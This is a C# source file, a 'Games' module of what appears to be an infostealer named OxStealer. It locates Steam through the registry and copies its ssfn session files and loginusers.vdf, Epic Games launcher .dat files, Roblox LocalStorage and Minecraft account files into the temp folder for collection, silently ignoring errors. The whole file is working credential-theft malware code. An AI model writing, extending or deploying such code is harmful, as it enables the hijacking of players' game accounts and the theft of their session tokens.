using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace OxStealer.Modules
{
    internal static class Games
    {
        public static Dictionary<string, object> GrabAll()
        {
            var r = new Dictionary<string, object>();
            r["steam"] = Steam();
            r["epic"] = Epic();
            r["roblox"] = Roblox();
            r["minecraft"] = Minecraft();
            return r;
        }

        static Dictionary<string, object> Steam()
        {
            var d = new Dictionary<string, object>();
            try
            {
                using var k = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam");
                var sp = k?.GetValue("SteamPath")?.ToString();
                if (string.IsNullOrEmpty(sp) || !Directory.Exists(sp)) return d;

                var cfg = Path.Combine(sp, "config");
                var ssfn = new List<string>();
                foreach (var f in Directory.GetFiles(cfg, "ssfn*"))
                {
                    var dst = Path.Combine(Path.GetTempPath(), "steam_" + Path.GetFileName(f));
                    try { File.Copy(f, dst, true); ssfn.Add(Path.GetFileName(f)); } catch { }
                }
                d["ssfn"] = ssfn;

                var login = Path.Combine(cfg, "loginusers.vdf");
                if (File.Exists(login))
                {
                    var dst = Path.Combine(Path.GetTempPath(), "steam_loginusers.vdf");
                    try { File.Copy(login, dst, true); d["loginusers"] = dst; } catch { }
                }
            }
            catch { }
            return d;
        }

        static List<string> Epic()
        {
            var outList = new List<string>();
            var p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "EpicGamesLauncher", "Saved", "Config", "Windows");
            if (!Directory.Exists(p)) return outList;
            foreach (var f in Directory.GetFiles(p, "*.dat"))
            {
                var dst = Path.Combine(Path.GetTempPath(), "epic_" + Path.GetFileName(f));
                try { File.Copy(f, dst, true); outList.Add(Path.GetFileName(f)); } catch { }
            }
            return outList;
        }

        static List<string> Roblox()
        {
            var outList = new List<string>();
            var p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Roblox", "LocalStorage");
            if (!Directory.Exists(p)) return outList;
            try
            {
                var dst = Path.Combine(Path.GetTempPath(), "roblox_ls");
                CopyDir(p, dst);
                outList.Add(dst);
            }
            catch { }
            return outList;
        }

        static List<string> Minecraft()
        {
            var outList = new List<string>();
            var p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
            foreach (var f in new[] { "launcher_accounts.json", "launcher_profiles.json" })
            {
                var src = Path.Combine(p, f);
                if (!File.Exists(src)) continue;
                var dst = Path.Combine(Path.GetTempPath(), "mc_" + f);
                try { File.Copy(src, dst, true); outList.Add(f); } catch { }
            }
            return outList;
        }

        static void CopyDir(string src, string dst)
        {
            Directory.CreateDirectory(dst);
            foreach (var f in Directory.GetFiles(src, "*", SearchOption.AllDirectories))
            {
                var rel = Path.GetRelativePath(src, f);
                var target = Path.Combine(dst, rel);
                Directory.CreateDirectory(Path.GetDirectoryName(target));
                try { File.Copy(f, target, true); } catch { }
            }
        }
    }
}